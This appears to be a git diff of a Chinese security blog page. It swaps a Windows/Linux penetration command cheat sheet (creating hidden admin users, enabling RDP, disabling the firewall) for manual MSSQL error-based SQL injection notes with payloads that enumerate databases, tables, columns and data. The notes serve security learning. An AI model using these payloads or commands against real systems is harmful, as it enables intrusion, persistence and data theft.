@@ -7,18 +7,18 @@
 
 
 
-    <meta name="description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+    <meta name="description" content="MSSQL注入笔记 在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了.数据库的信息收集语句 判断数据是否为mssql：and exists(select * from sysobjects) 获取当前的数据库名称：and 1=convert(int,(db_name())) 获取数据版本信息：and">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/2019/08/04/windows与linux命令/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/MSSQL注入笔记/index.html">
 <meta property="og:site_name" content="lsadaharu">
-<meta property="og:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta property="og:description" content="MSSQL注入笔记 在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了.数据库的信息收集语句 判断数据是否为mssql：and exists(select * from sysobjects) 获取当前的数据库名称：and 1=convert(int,(db_name())) 获取数据版本信息：and">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
-<meta property="og:updated_time" content="2019-07-27T04:43:18.888Z">
+<meta property="og:updated_time" content="2019-08-14T15:04:09.559Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
-<meta name="twitter:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta name="twitter:description" content="MSSQL注入笔记 在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了.数据库的信息收集语句 判断数据是否为mssql：and exists(select * from sysobjects) 获取当前的数据库名称：and 1=convert(int,(db_name())) 获取数据版本信息：and">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -144,13 +144,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-08-04T02:44:41.273Z">2019-08-04</time>
+                <time class="level-item has-text-grey" datetime="2019-08-17T03:35:01.658Z">2019-08-17</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    7 minutes read (About 1010 words)
+                    3 minutes read (About 452 words)
                 </span>
                 
                 
@@ -163,69 +163,32 @@
             
         </h1>
         <div class="content">
-            <h1 id="渗透windows与linux常用命令"><a href="#渗透windows与linux常用命令" class="headerlink" title="渗透windows与linux常用命令"></a>渗透windows与linux常用命令</h1><h2 id="渗透windows常用DOS命令"><a href="#渗透windows常用DOS命令" class="headerlink" title="渗透windows常用DOS命令"></a>渗透windows常用DOS命令</h2><ol>
-<li>查看本机ip信息: <code>ipconfig</code></li>
-<li>释放ip: <code>ipconfig/release</code></li>
-<li>重新获取ip: <code>ipconfig/renew</code></li>
-<li>查看系统信息: <code>systeminfo</code></li>
-<li>查看局域网计算机列表: <code>arp -a</code></li>
-<li>查看目录信息: <code>dir</code></li>
-<li>切换目录: <code>cd 目录名</code></li>
-<li>打开某个文件: <code>start 文件名</code></li>
-<li>打开某个网页: <code>start URL</code></li>
-<li>创建文件内容: <code>echo xxxx &gt; x.txt</code></li>
-<li>查看文件内容: <code>type xxx.txt</code></li>
-<li>创建目录: <code>md 目录名</code></li>
-<li>删除文件夹: <code>rd 文件夹名</code></li>
-<li>删除文件: <code>del 文件名</code></li>
-<li>复制文件: <code>copy 文件名</code></li>
-<li>移动文件或文件夹: <code>move 文件(夹)名 路径</code></li>
-<li>以树形列出文件夹结构: <code>tree 文件夹名</code></li>
-<li>查看以启动的服务: <code>net start</code></li>
-<li>开启或停止某个服务: <code>net start(stop) 服务名</code></li>
-<li>查看端口占用进程情况: <code>netstat -ano</code></li>
-<li>查看本机用户信息: <code>net user</code></li>
-<li>查看用户组信息: <code>net localgroup</code></li>
-<li>创建用户username: <code>net user username/add</code></li>
-<li>创建隐藏用户username: <code>net user username$/add</code></li>
-<li>将用户username添加到管理用户组: `net localgroup administrators username/add</li>
-<li>更改用户username密码: <code>net user username 更改的密码</code></li>
-<li>删除用户username: <code>net user username/delete</code></li>
-<li>激活(禁用)用户username: <code>net user username/active:yes(no)</code></li>
-<li>开启3389: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>或者<code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></li>
-<li>关闭防火墙: <code>netsh firewall set opmode mode=disable</code>或者<code>netsh advfirewall set allprofiles state off</code></li>
+            <h1 id="MSSQL注入笔记"><a href="#MSSQL注入笔记" class="headerlink" title="MSSQL注入笔记"></a>MSSQL注入笔记</h1><hr>
+<h2 id="在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了"><a href="#在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了" class="headerlink" title="在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了."></a>在MSSQL注入中，很多人都是用工具跑，但是如今的各种waf，各种防御机制的存在，使得用工具跑很难成功，因此mssql的手工注入方式显得尤其重要了.</h2><h3 id="数据库的信息收集语句"><a href="#数据库的信息收集语句" class="headerlink" title="数据库的信息收集语句"></a>数据库的信息收集语句</h3><ol>
+<li>判断数据是否为mssql：<code>and exists(select * from sysobjects)</code></li>
+<li>获取当前的数据库名称：<code>and 1=convert(int,(db_name()))</code></li>
+<li>获取数据版本信息：<code>and 1=convert(int,(@@version())</code></li>
+<li>获取全部数据库：<code>and 1=convert(int,(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)))</code>或者<code>and 1=convert(int,(select &#39;|&#39;%2bname%2b&#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;)))</code></li>
 </ol>
-<h1 id="渗透linux常见命令"><a href="#渗透linux常见命令" class="headerlink" title="渗透linux常见命令"></a>渗透linux常见命令</h1><ol>
-<li>显示主机信息: <code>uname -a</code></li>
-<li>查看主机名: <code>hostname</code></li>
-<li>查看ip信息: <code>ipconfig</code></li>
-<li>查看当前路径: <code>pwd</code></li>
-<li>查看当前目录文件: <code>ls</code> 查看目录文件详细信息<code>ls -l</code></li>
-<li>创建目录: <code>mkdir 目录名</code></li>
-<li>创建新文件: <code>touch 文件名</code></li>
-<li>为文件创建软连接: <code>ln -s 源文件或者目录 链接文件或者目录</code></li>
-<li>复制文件或者目录: <code>cp 源文件或目录 目标文件或目录</code></li>
-<li>删除文件或目录: <code>rm -f</code>强制删除不提醒，<code>rm -r</code>递归删除整个目录树,<code>rm -i</code>删除文件或目录提醒。</li>
-<li>移动文件: <code>mv 源文件或目录</code></li>
-<li>查找文件: <code>find -name 文件名</code></li>
-<li>查看文件内容: <code>cat</code>+文件名</li>
-<li>分页显示文件内容: <code>more</code>+文件名</li>
-<li>查看文件属性: <code>file</code>+文件名</li>
-<li>gzip压缩打包以及解压:<code>gizp -9</code>+文件，最大压缩比压缩。保留源文件压缩<code>gzip -c 文件名 &gt; 文件名.gz</code>解压<code>gzip -dv</code>+文件名.gz，保留源文件解压<code>gzip -cd 文件名.gz &gt; 压缩文件存放的目录地址</code></li>
-<li>bzip2压缩打包: <code>bzip2</code>+文件名。保留源文件压缩<code>bzip2 -k</code>+文件名.解压<code>bzip2 -dv</code>+文件名.bzip2 .保留源文件解压: <code>bzip2 -kd</code>+文件名.bzip2</li>
-<li>tar压缩解压: 以gzip格式压缩<code>tar -zcvf newfile.tar.gz 源文件</code>  gzip格式解压 <code>tar -zxvf 压缩包名 -C 解压的文件放置的目录</code> 以bzip2格式压缩 <code>tar -jcvf newfile.tar.bzip2 源文件</code> 以bzip2格式解压 <code>tar -jxvf 压缩包名 -C 解压的文件放置的目录</code> 查看压缩包中的内容<code>tar -tvf 压缩包名</code></li>
-<li>改变文件权限: <code>chmod (r-&gt;4 w-&gt;2 x-&gt;1)777 文件名</code>或者按user(所有者)-&gt;u，group(组)-&gt;u，others(其他人)-&gt;u,三套属性a.r-&gt;(可读),w-&gt;(可写),x-&gt;(可执行)赋予权限，如chmod u+r test.c-&gt;赋予test.c所有者可读权限.chmod a+w test.c-&gt;赋予test.c所有者，组，以及其他人可写权限。</li>
-<li>更改文件/目录所属的拥有者和组: <code>chown 拥有者名:组名 文件或目录名</code> 只修改所属组: <code>chogrp -R 组名 文件或目录名</code></li>
-<li>添加用户: <code>adduser 用户名</code> 修改密码 <code>passwd 用户名</code>删除用户 <code>userdel 用户名</code></li>
-<li>查看目前登陆身份: <code>whoami</code></li>
-<li>查看目前登陆的用户和组: <code>id</code></li>
-<li>显示磁盘可读的情况: <code>df -h</code></li>
-<li>显示最后登陆的用户: <code>last</code></li>
-<li>查看进程: <code>ps -aux</code> 进程的动态情况 <code>top</code></li>
-<li>终止进程: <code>kill -9 PID</code></li>
-<li>显示进程ID的网络接口: <code>netstat -tulpn</code></li>
-<li>启动ip转发: <code>echo &#39;1&#39; &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<h3 id="用户信息收集语句"><a href="#用户信息收集语句" class="headerlink" title="用户信息收集语句"></a>用户信息收集语句</h3><ol>
+<li>查看是否为db_owner权限：<code>and 1=(select IS_SRVROLEMEMBER(&#39;db_owner&#39;))</code></li>
+<li>查看当前用户是否为数据库管理员：<code>and 1=CONVERT(int,(select is_srvrolemember(&#39;sysadmin&#39;)))</code></li>
+<li>查看连接数据库的用户：<code>and 1=convert(int,(user))</code></li>
+<li>获取当前数据库用户名：<code>and 1=convert(int,(select suser_sname()))</code></li>
 </ol>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><ol>
+<li>获取当前库的第一张表名：<code>and 1=convert(int,(select top 1 table_name from information_schema.tables ))</code></li>
+<li>将表名存入table not in的元祖中继续查询多余的表，直到报错：<code>and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in(&#39;查出的表名1&#39;,&#39;表名2&#39;...)))</code></li>
+</ol>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><ol>
+<li>获取表名下的列名：<code>and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&#39;表名&#39; ))</code></li>
+<li>将所有列名存入column_name not in的元祖中，继续查询列名直到报错：<code>and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&#39;表名&#39; and column_name not in(&#39;列名1&#39;,&#39;列名2&#39;，...)))</code></li>
+</ol>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><ol>
+<li>直接查询相应列字段下的第一条数据：<code>and 1=convert(int,(select top 1 列名 from 表名 ))</code></li>
+</ol>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.admintony.com/MSSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">http://www.admintony.com/MSSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html</a><br><a href="https://klionsec.github.io/2016/05/16/mssql-error-injection/" target="_blank" rel="noopener">https://klionsec.github.io/2016/05/16/mssql-error-injection/</a></p>
 
         </div>
         
@@ -276,7 +239,7 @@
     <div class="level post-navigation is-flex-wrap is-mobile">
         
         <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/04/sql注入_mysql_3/">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/17/Access数据库注入笔记/">
                 <i class="level-item fas fa-chevron-left"></i>
                 <span class="level-item"></span>
             </a>
@@ -284,7 +247,7 @@
         
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/04/sql注入_mysql_4/">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/17/Windows下抓取hash的几种方法/">
                 <span class="level-item"></span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
